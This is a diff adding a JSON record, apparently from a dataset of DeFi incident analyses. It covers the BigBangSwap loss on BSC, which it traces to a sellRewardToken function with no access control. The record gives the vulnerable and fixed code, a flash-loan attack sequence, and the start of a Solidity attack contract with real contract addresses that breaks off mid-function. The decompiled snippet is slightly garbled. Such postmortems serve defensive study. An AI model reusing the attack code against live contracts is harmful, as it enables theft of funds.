@@ -1,0 +1,37 @@
+{
+ "id": "2024__2024-04-XX_BigBangSwap_SellRewardTokenAccessControl",
+ "source_file": "2024/2024-04-XX_BigBangSwap_SellRewardTokenAccessControl.md",
+ "title": "BigBangSwap — sellRewardToken Missing Access Control Analysis",
+ "date": "2024-04-01",
+ "protocol": "BigBangSwap",
+ "chain": "BSC",
+ "loss_raw": "~5,000 BUSD",
+ "loss_usd": null,
+ "root_cause": "`sellRewardToken(uint256 amount)` has no access control, allowing anyone to sell BGG for BUSD; the reward pool was drained via repeated calls from multiple attack contract instances",
+ "attack_tx": null,
+ "vulnerable_contract": "TransparentProxy 0xa45D4359",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: sellRewardToken has no access control\ncontract BigBangSwapProxy {\n    // No onlyOwner — anyone can sell reward tokens\n    function sellRewardToken(uint256 amount) external {\n        // Executes BGG → BUSD sell logic\n        IPancakeRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount,\n            0,\n            path,  // BGG → BUSD\n            msg.sender,  // ← rewards sent to caller\n            block.timestamp\n        );\n    }\n}\n\n//",
+  "// File: BigBangSwap_decompiled.sol\ncontract BigBangSwap {\ncontract BigBangSwap {\n    address public owner;\n\n\n    // Selector: 0x1b2ce7f3\n    function unknown_1b2ce7f3() external {}  // ❌ Vulnerability\n\n    // Selector: 0x278f7943\n    function unknown_278f7943() external {}\n\n    // Selector: 0x08f28397\n    function unknown_08f28397() external {}\n\n    // Selector: 0x03e14691\n    function unknown_03e14691() external {}\n\n    // Selector: 0x5c60da1b\n    function implementation() external {}\n\n    // Selector: 0x4e487b71\n    function Panic(uint256 p0) external {}\n}"
+ ],
+ "code_after": [
+  "✅ Safe code: only owner can sell reward tokens\nfunction sellRewardToken(uint256 amount) external onlyOwner {\n    require(amount <= rewardBalance, \"exceeds reward balance\");\n    IPancakeRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        amount, 0, path, owner(), block.timestamp\n    );\n    emit RewardSold(amount);\n}"
+ ],
+ "steps": [
+  "→ [1] DODO Flash Loan: borrow 50 BUSD",
+  "→ [2] Deploy 70 attack contracts",
+  "→ [3] Each instance:",
+  "Swap BUSD → BGG (PancakeRouter)",
+  "Call sellRewardToken(amount) → BUSD returned",
+  "→ [4] BGG reward pool drained through repeated execution",
+  "→ [5] Repay DODO flash loan",
+  "→ [6] ~5,000 BUSD profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] DODO Flash Loan: borrow 50 BUSD\n  │\n  ├─→ [2] Deploy 70 attack contracts\n  │\n  ├─→ [3] Each instance:\n  │         ├─ Swap BUSD → BGG (PancakeRouter)\n  │         └─ Call sellRewardToken(amount) → BUSD returned\n  │\n  ├─→ [4] BGG reward pool drained through repeated execution\n  │\n  ├─→ [5] Repay DODO flash loan\n  │\n  └─→ [6] ~5,000 BUSD profit",
+  "interface ITransparentProxy {\n    function sellRewardToken(uint256 amount) external;\n}\n\ninterface IDPPAdvanced {\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    ITransparentProxy constant proxy  = ITransparentProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);\n    IDPPAdvanced      constant dodo   = IDPPAdvanced(/* DODO DPP */);\n    IERC20            constant BUSD   = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20            constant BGG    = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);\n\n    function testExploit() external {\n        // [1] Flash loan 50 BUSD\n        dodo.flashLoan(0, 50e18, address(this), abi.encode(\"flashloan\"));\n    }\n\n    function DPPFlashLoanCall(addre"
+ ]
+}
